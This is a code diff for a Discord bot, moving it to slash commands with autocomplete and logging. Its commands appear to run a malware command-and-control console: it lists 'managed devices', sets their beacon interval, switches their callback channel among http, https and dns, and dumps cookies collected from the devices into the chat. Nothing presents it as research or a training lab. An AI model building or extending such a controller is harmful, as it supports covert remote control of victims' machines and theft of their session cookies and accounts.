@@ -1,13 +1,34 @@
 """
 Discord bot entry point.
-Registers commands and enforces admin-only access control.
+Uses slash commands (app_commands) with autocomplete for a better UX,
+and logs every command invocation to the terminal for tracking.
 """
 
+import logging
+
 import discord
+from discord import app_commands
 from discord.ext import commands
 
-from config import DISCORD_BOT_TOKEN, ADMIN_DISCORD_ID, COMMAND_PREFIX
+from config import (
+    ADMIN_DISCORD_ID,
+    COMMAND_PREFIX,
+    DISCORD_BOT_TOKEN,
+    VALID_BEACON_INTERVALS,
+    VALID_COMMUNICATION_PROTOCOLS,
+)
 from devices import DeviceManager
+
+# ---------------------------------------------------------------------------
+# Logging setup
+# ---------------------------------------------------------------------------
+
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    datefmt="%Y-%m-%d %H:%M:%S",
+)
+logger = logging.getLogger("discord-bot")
 
 # ---------------------------------------------------------------------------
 # Bot setup
@@ -21,12 +42,48 @@ device_manager = DeviceManager()
 
 
 # ---------------------------------------------------------------------------
-# Access control
+# Helpers
 # ---------------------------------------------------------------------------
 
-def is_admin(ctx: commands.Context) -> bool:
-    """Check whether the command author is the authorised admin."""
-    return ctx.author.id == ADMIN_DISCORD_ID
+def is_admin_user(interaction: discord.Interaction) -> bool:
+    """Check whether the interaction author is the authorised admin."""
+    return interaction.user.id == ADMIN_DISCORD_ID
+
+
+def log_command(
+    interaction: discord.Interaction,
+    command_name: str,
+    args: str = "",
+) -> None:
+    """Log a command invocation to the terminal."""
+    user = interaction.user
+    guild = interaction.guild
+    channel = interaction.channel
+
+    guild_name = guild.name if guild else "DM"
+    channel_name = getattr(channel, "name", "unknown")
+
+    args_display = f" ({args})" if args else ""
+    logger.info(
+        "Command /%s%s executed by %s (ID: %s) in #%s @ %s",
+        command_name,
+        args_display,
+        user,
+        user.id,
+        channel_name,
+        guild_name,
+    )
+
+
+def log_access_denied(interaction: discord.Interaction, command_name: str) -> None:
+    """Log a denied access attempt to the terminal."""
+    user = interaction.user
+    logger.warning(
+        "ACCESS DENIED: /%s attempted by %s (ID: %s)",
+        command_name,
+        user,
+        user.id,
+    )
 
 
 # ---------------------------------------------------------------------------
@@ -35,67 +92,137 @@ def is_admin(ctx: commands.Context) -> bool:
 
 @bot.event
 async def on_ready() -> None:
-    """Log a message when the bot successfully connects to Discord."""
-    print(f"Bot connected as {bot.user} (ID: {bot.user.id})")  # type: ignore[union-attr]
-    print("Waiting for commands...")
+    """Sync slash commands and log a message when the bot connects."""
+    try:
+        synced = await bot.tree.sync()
+        logger.info(
+            "Bot connected as %s (ID: %s) — synced %d slash command(s)",
+            bot.user,
+            bot.user.id,  # type: ignore[union-attr]
+            len(synced),
+        )
+    except Exception as e:
+        logger.error("Failed to sync commands: %s", e)
 
-
-@bot.event
-async def on_command_error(ctx: commands.Context, error: commands.CommandError) -> None:
-    """Global error handler for command errors."""
-    if isinstance(error, commands.CheckFailure):
-        await ctx.send("🚫 **Access denied.** You are not authorised to use this bot.")
-    elif isinstance(error, commands.MissingRequiredArgument):
-        await ctx.send(f"⚠️ Missing required argument: `{error.param.name}`.")
-    elif isinstance(error, commands.BadArgument):
-        await ctx.send("⚠️ Invalid argument type. Please check the command usage.")
-    elif isinstance(error, commands.CommandNotFound):
-        await ctx.send("❓ Unknown command. Use `!help` to see available commands.")
-    else:
-        await ctx.send("💥 An unexpected error occurred.")
-        raise error
+    logger.info("Waiting for commands...")
 
 
 # ---------------------------------------------------------------------------
-# Commands
+# Autocomplete callbacks
 # ---------------------------------------------------------------------------
 
-@bot.command(name="show-devices", help="Display all managed devices and their status.")
-@commands.check(is_admin)
-async def show_devices(ctx: commands.Context) -> None:
+async def beacon_interval_autocomplete(
+    interaction: discord.Interaction,
+    current: str,
+) -> list[app_commands.Choice[int]]:
+    """Provide autocomplete options for beacon interval values."""
+    return [
+        app_commands.Choice(name=f"{val} seconds", value=val)
+        for val in VALID_BEACON_INTERVALS
+        if current == "" or str(val).startswith(current)
+    ]
+
+
+async def protocol_autocomplete(
+    interaction: discord.Interaction,
+    current: str,
+) -> list[app_commands.Choice[str]]:
+    """Provide autocomplete options for communication protocols."""
+    return [
+        app_commands.Choice(name=proto, value=proto)
+        for proto in VALID_COMMUNICATION_PROTOCOLS
+        if current == "" or proto.startswith(current.lower())
+    ]
+
+
+# ---------------------------------------------------------------------------
+# Slash Commands
+# ---------------------------------------------------------------------------
+
+@bot.tree.command(
+    name="show-devices",
+    description="Display all managed devices and their status.",
+)
+async def show_devices(interaction: discord.Interaction) -> None:
     """Send the list of managed devices to the channel."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "show-devices")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "show-devices")
     response = device_manager.show_devices()
-    await ctx.send(response)
+    await interaction.response.send_message(response)
 
 
-@bot.command(
+@bot.tree.command(
     name="set-beacon-interval",
-    help="Set the beacon interval. Valid values: 2, 8, 16, 32.",
+    description="Set the beacon interval. Valid values: 2, 8, 16, 32.",
 )
-@commands.check(is_admin)
-async def set_beacon_interval(ctx: commands.Context, interval: int) -> None:
+@app_commands.autocomplete(interval=beacon_interval_autocomplete)
+@app_commands.describe(interval="Beacon interval in seconds (2, 8, 16, or 32)")
+async def set_beacon_interval(
+    interaction: discord.Interaction,
+    interval: int,
+) -> None:
     """Set the beacon interval to the provided value."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "set-beacon-interval")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "set-beacon-interval", f"interval={interval}")
     response = device_manager.set_beacon_interval(interval)
-    await ctx.send(response)
+    await interaction.response.send_message(response)
 
 
-@bot.command(name="request-cookies", help="Display all stored cookies.")
-@commands.check(is_admin)
-async def request_cookies(ctx: commands.Context) -> None:
-    """Send the current cookie list to the channel."""
-    response = device_manager.request_cookies()
-    await ctx.send(response)
-
-
-@bot.command(
-    name="set-communication-protocol",
-    help="Set the communication protocol. Valid values: http, https, dns.",
+@bot.tree.command(
+    name="request-cookies",
+    description="Display all stored cookies from managed devices.",
 )
-@commands.check(is_admin)
-async def set_communication_protocol(ctx: commands.Context, protocol: str) -> None:
+async def request_cookies(interaction: discord.Interaction) -> None:
+    """Send the current cookie list to the channel."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "request-cookies")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "request-cookies")
+    response = device_manager.request_cookies()
+    await interaction.response.send_message(response)
+
+
+@bot.tree.command(
+    name="set-communication-protocol",
+    description="Set the communication protocol. Valid: http, https, dns.",
+)
+@app_commands.autocomplete(protocol=protocol_autocomplete)
+@app_commands.describe(protocol="Protocol to use (http, https, or dns)")
+async def set_communication_protocol(
+    interaction: discord.Interaction,
+    protocol: str,
+) -> None:
     """Set the communication protocol to the provided value."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "set-communication-protocol")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "set-communication-protocol", f"protocol={protocol}")
     response = device_manager.set_communication_protocol(protocol)
-    await ctx.send(response)
+    await interaction.response.send_message(response)
 
 
 # ---------------------------------------------------------------------------
